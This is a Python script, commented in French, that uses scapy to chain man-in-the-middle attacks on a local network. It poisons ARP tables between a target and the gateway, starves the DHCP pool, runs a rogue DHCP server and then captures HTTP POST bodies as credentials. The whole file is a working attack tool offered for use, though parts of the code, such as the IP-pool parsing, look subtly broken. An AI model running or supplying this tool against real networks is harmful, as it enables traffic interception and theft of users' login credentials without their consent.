#!/usr/bin/env python3

#!/usr/bin/env python3

import time
from threading import Thread
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.dns import DNSRR, DNS
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.http import HTTPRequest
from scapy.packet import Raw
import netifaces

# Classe de couleurs pour l'affichage
class bcolors:
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


# Fonction pour obtenir l'adresse MAC d'une IP donnée
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Impossible de trouver l'adresse MAC pour l'IP {ip}")
        return None


# Classe ARP Spoofing
class ARPSpoofing:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = self.get_interface()

    def get_interface(self):
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            if "eth" in iface or "wlan" in iface:
                return iface
        return None

    def enable_ip_forwarding(self):
        with open("/proc/sys/net/ipv4/ip_forward", "w") as ip_forward_file:
            ip_forward_file.write("1")

    def spoof(self):
        print("[*] ARP Spoofing - Commence l'empoisonnement des cibles...")
        victim_mac = get_mac(self.target_ip)
        gateway_mac = get_mac(self.gateway_ip)

        if not victim_mac or not gateway_mac:
            print("[!] Impossible de récupérer les adresses MAC.")
            return

        print("[*] Enabling IP Forwarding...")
        self.enable_ip_forwarding()

        try:
            for _ in range(10):  # Envoie ARP Spoofing pour 10 cycles
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=victim_mac), verbose=False, iface=self.interface)
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=gateway_mac), verbose=False, iface=self.interface)
                time.sleep(0.5)
            print("[*] ARP Spoofing - Attaque terminée")
        except Exception as e:
            print("[!] Erreur pendant ARP Spoofing:", str(e))


# Classe DHCP Starvation
class DHCPStarvation:
    def __init__(self):
        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]

    def start_attack(self, iteration=10):
        print("[*] DHCP Starvation - Lancement de l'attaque...")
        for _ in range(iteration):
            request = self._generate_packet_client("discover", RandMAC())
            sendp(request)
            time.sleep(0.3)
        print("[*] DHCP Starvation - Attaque terminée")

    def _generate_packet_client(self, msg_type, mac):
        return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac) /
                DHCP(options=[('message-type', msg_type), ("server_id", self.__GATEWAY_IP), "end"]))


# Classe DHCP Rogue Server
class DHCPRogueServer:
    def __init__(self):
        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
        self.__DHCPServerIp = conf.iface.ip
        self.__DHCPMac = Ether().src
        self.__IPPool = []

    def setIPPool(self, IPPool):
        start, end = map(int, IPPool.split("-")[1].split(".")), map(int, IPPool.split("-")[0].split("."))
        self.__IPPool = [f"{end[0]}.{end[1]}.{end[2]}.{x}" for x in range(start[3], end[3] + 1)]

    def listener(self, packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 1 and len(self.__IPPool) > 0:
            IPClient = self.__IPPool.pop()
            offer = self.generatePacketServerOffer("offer", IPClient, packet)
            sendp(offer)

    def generatePacketServerOffer(self, type, IPClient, packet):
        return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
                IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=IPClient, siaddr=self.__DHCPServerIp, chaddr=packet[Ether].chaddr) /
                DHCP(options=[('server_id', self.__DHCPServerIp), ('message-type', type), 'end']))

    def start(self, iprange):
        print("[*] DHCP Rogue Server - Lancement du serveur...")
        self.setIPPool(iprange)
        sniff(filter="udp and port 67", prn=self.listener)
        print("[*] DHCP Rogue Server - Serveur terminé")


# Classe HTTP Credential Sniffer (en continu)
def credentialsSniffing(packet):
    if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        credentials = packet[Raw].load.decode()
        print(f"[+] Captured credentials from {url}: {credentials}")


# Détection automatique de la passerelle
gateway_ip = conf.route.route("0.0.0.0")[2]
target_ip = "192.168.1.10"  # Exemple d'adresse IP cible
iprange = "192.168.1.100-192.168.1.150"

# Initialisation des threads pour chaque attaque
arp_spoofing = ARPSpoofing(target_ip, gateway_ip)
dhcp_starvation = DHCPStarvation()
dhcp_rogue_server = DHCPRogueServer()

# Lancer ARP Spoofing et DHCP Starvation en parallèle
arp_thread = Thread(target=arp_spoofing.spoof)
dhcp_starvation_thread = Thread(target=dhcp_starvation.start_attack, args=(10,))

# Démarrage des threads pour les attaques ARP et DHCP Starvation
arp_thread.start()
dhcp_starvation_thread.start()

# Attendre que les attaques ARP et DHCP Starvation se terminent
arp_thread.join()
dhcp_starvation_thread.join()

# Lancer le DHCP Rogue Server
dhcp_rogue_server.start(iprange)

# Sniff HTTP (en continu)
print("[*] Lancement de HTTP sniffing en continu...")
sniff(filter="tcp port 80", prn=credentialsSniffing)


###########################################################################
###Ton propre Script d'ARP Scan                                         ###
###Ton proper script d'ARP spoof                                        ###
###https://github.com/juanga333/DHCP-Server/blob/main/starvation.py     ###
###https://github.com/juanga333/DHCP-Server/blob/main/dhcpserver.py     ###
###https://github.com/juanga333/DNS-Server/blob/main/dnsserver.py       ###
###https://github.com/juanga333/Simply-HTTP-sniffer/blob/main/sniffer.py###
###########################################################################
